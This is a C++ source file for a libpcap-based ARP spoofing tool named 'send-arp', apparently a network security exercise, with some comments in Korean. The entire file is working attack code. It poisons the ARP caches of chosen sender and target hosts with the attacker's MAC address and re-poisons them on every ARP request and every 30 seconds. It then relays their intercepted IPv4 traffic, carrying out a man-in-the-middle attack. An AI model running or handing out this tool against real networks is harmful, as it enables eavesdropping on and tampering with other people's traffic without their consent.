#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <map>
#include <ctime>
#include <pcap.h>
#include <ifaddrs.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

using namespace std;

#define REPEAT_CYCLE_SEC 30

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct EthIpPacket final {
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

map<Ip, Mac> IpMacMap = map<Ip, Mac>();

Ip senderTargetExists(const std::multimap<Ip, Ip>& mmap, Ip key, Ip value) {
	if (mmap.find(key) == mmap.end()) return Ip("127.1.1.1");

    auto range = mmap.equal_range(key);

    for (auto it = range.first; it != range.second; ++it) if (it->second == value) return value;
    return Ip("127.1.1.1");
}

Mac getMyMac(const char* interfaceName) {
    struct ifaddrs *ifaddr = NULL;
    struct ifaddrs *ifa = NULL;

    string macAddr = "";

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
		return Mac::nullMac();
    } else {
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if ((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET) && !strcmp(ifa->ifa_name, interfaceName)) {
				struct sockaddr_in *sa = (struct sockaddr_in *) ifa->ifa_addr;
            	
                ostringstream oss;
                struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
                for (int i = 0; i < s->sll_halen; i++) {
                    oss << hex << setfill('0') << setw(2) << static_cast<int>(s->sll_addr[i]);
                    if (i != s->sll_halen - 1) oss << ":";
                }
                macAddr = oss.str();
            }
        }

		if (macAddr == "") {
			fprintf(stderr, "Failed to get MAC address\n");
			exit(EXIT_FAILURE);
		}

        freeifaddrs(ifaddr);
        return Mac(macAddr);
    }
}


Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac senderMac, const Ip targetIP, int timeout = 3000) {
	EthArpPacket packet;
	// * 1. send ARP request to get MAC address of ip_str
	packet.eth_.dmac_ = Mac::broadcastMac();
	packet.eth_.smac_ = senderMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);

	packet.arp_.smac_ = senderMac;
	packet.arp_.sip_ = htonl(senderIP);
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(targetIP);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
		exit(EXIT_FAILURE);
		
        return Mac::nullMac();	
    }

	clock_t start = clock();
	
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* replyPacket;

        res = pcap_next_ex(handle, &header, &replyPacket);
        if (!res) {
            continue; 
        } else if (res < 0) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }

        EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;

        if (ntohs(receivedPacket->eth_.type_) == EthHdr::Arp &&
            ntohs(receivedPacket->arp_.op_) == ArpHdr::Reply &&
            ntohl(receivedPacket->arp_.sip_) == targetIP &&
    		ntohl(receivedPacket->arp_.tip_) == senderIP) {

            return receivedPacket->arp_.smac_;            
        }

		if ((double)(clock() - start) > timeout) {
            fprintf(stderr, "ARP reply not received within the specified timeout(%s)\n", string(targetIP).c_str());
			return Mac::nullMac();
        }
    }
    
    fprintf(stderr, "Failed to get ARP reply\n");
}

void send_arp_attack_packet(pcap_t* handle, const Ip senderIP, const Ip targetIp, Mac myMac) {
	Mac senderMac;
	Mac targetMac;

	if (IpMacMap.find(senderIP) == IpMacMap.end()) {
		// 1차 ARP Table 수정
		senderMac = resolveMacAddrFromSendArp(handle, targetIp, myMac, senderIP);
		if (senderMac.isNull()) {
			printf("Faild Get Mac Address(%s)\n", string(senderIP).c_str());
			return;
		}

		IpMacMap[senderIP] = senderMac;
	}

	// 2차 ARP Table 수정
	EthArpPacket packet;

	packet.eth_.dmac_ = IpMacMap[senderIP];
	packet.eth_.smac_ = myMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = myMac;
	packet.arp_.sip_ = htonl(targetIp);
	packet.arp_.tmac_ = IpMacMap[senderIP];
	packet.arp_.tip_ = htonl(senderIP);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	printf("The MAC address of IP %s in the ARP Table of IP %s has been changed to my Mac address(%s).\n", string(senderIP).c_str(), string(targetIp).c_str(), string(myMac).c_str());
}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		exit(EXIT_FAILURE);
	}

	char* interface = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (!handle) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		exit(EXIT_FAILURE);
	}

	Mac myMac = getMyMac(interface);

	multimap<Ip, Ip> senderTargetMap;
	for (int i = 2; i < argc; i += 2) senderTargetMap.insert({Ip(argv[i]), Ip(argv[i + 1])});

	clock_t last_send = clock();
	for (const auto& [sender, target] : senderTargetMap) 
		send_arp_attack_packet(handle, sender, target, myMac);
	
	printf("Updated the ARP tables of all attack targets\n");
	
	while (true) {
		struct pcap_pkthdr* header;
        const u_char* replyPacket;

        int res = pcap_next_ex(handle, &header, &replyPacket);
        if (!res) {
            continue; 
        } else if (res < 0) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }

        EthHdr* receivedPacket = (EthHdr*)replyPacket;
		switch (ntohs(receivedPacket->type_)) {
			case EthHdr::Arp:
				{
					EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;
					Ip sender = ntohl(receivedPacket->arp_.sip_);
					Ip target = ntohl(receivedPacket->arp_.tip_);

					if (senderTargetExists(senderTargetMap, sender, target).isLocalHost()) break;

					printf("Update Arp Table %s(Req) -> %s(Reply)\n", string(sender).c_str(), string(target).c_str());
					send_arp_attack_packet(handle, sender, target, myMac);
				
					// target이 sender에게 보내는 요청의 경우 매개변수로 두가지 방향 모두 입력되기에 sender 목록에 존재함.
				}
				break;
			case EthHdr::Ip4:
				{
					EthIpPacket* receivedPacketIp = (EthIpPacket*)replyPacket;
					if (receivedPacketIp->eth_.dmac_ != myMac) break;
					
					Ip sender = receivedPacketIp->ip_.src_ip(), target = receivedPacketIp->ip_.dst_ip();

					if (senderTargetExists(senderTargetMap, sender, target).isLocalHost()) break;

					receivedPacketIp->eth_.smac_ = myMac; 
					receivedPacketIp->eth_.dmac_ = IpMacMap[target];
					
					int packetLen = htons(receivedPacketIp->ip_.total_length_);
					printf("CatchPacket: %s -> %s Length:%d\n", string(sender).c_str(), string(target).c_str(), packetLen);

					int res = pcap_sendpacket(handle, (const u_char*)receivedPacketIp, sizeof(EthHdr)+packetLen);
					if (res) {
						fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
						break;
					}

					printf(
						"Sent modified packet %s -> %s(%s -> %s)\n", 
						string(receivedPacketIp->ip_.src_ip()).c_str(), 
						string(receivedPacketIp->ip_.dst_ip()).c_str(), 
						string(receivedPacketIp->eth_.smac_).c_str(), 
						string(receivedPacketIp->eth_.dmac_).c_str()
					);
				}
				break;
		}

		if ((double)(clock() - last_send) > REPEAT_CYCLE_SEC * CLOCKS_PER_SEC) {	
			last_send = clock();
			for (const auto& [sender, target] : senderTargetMap) 
				send_arp_attack_packet(handle, sender, target, myMac);

			printf("Updated the ARP tables of all attack targets\n");
		}
	}
	
	pcap_close(handle);
}